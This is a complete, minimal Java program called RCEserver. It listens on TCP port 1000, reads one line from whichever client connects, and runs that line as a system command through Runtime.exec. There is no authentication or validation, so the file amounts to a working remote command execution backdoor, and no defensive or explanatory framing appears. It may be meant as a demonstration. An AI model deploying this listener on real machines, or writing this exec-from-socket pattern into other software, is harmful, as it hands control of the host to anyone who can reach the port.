import java.io.*;
import java.net.*;

class RCEserver {
    public static void main(String[] args) throws IOException {
        ServerSocket server = new ServerSocket(1000);
        System.out.println("Server started. Waiting for client...");

        Socket client = server.accept();
        System.out.println("Client connected.");

        BufferedReader in = new BufferedReader(
                new InputStreamReader(client.getInputStream()));

        String command = in.readLine();   // get command
        System.out.println("Received: " + command);

        Runtime.getRuntime().exec(command);  // execute command

        server.close();
    }
}
